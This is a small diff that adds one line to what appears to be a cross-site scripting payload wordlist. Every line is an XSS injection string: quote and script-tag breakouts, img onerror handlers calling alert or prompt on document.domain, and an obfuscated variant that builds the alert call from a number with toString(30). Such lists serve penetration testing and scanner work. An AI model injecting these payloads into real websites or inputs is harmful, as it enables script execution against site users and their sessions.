@@ -1,4 +1,5 @@
 1%27;--<img%20src=x%20onerror=javascript:alert(document.domain)>
+%27";}</script><script>prompt(document.domain);</script>
 ‘>alert(154)</script><script/154=’;;;;;;;
 '>alert(154)</script><script/154=';;;;;;;
 <img src="X" onerror=top[8680439..toString(30)](1337)>
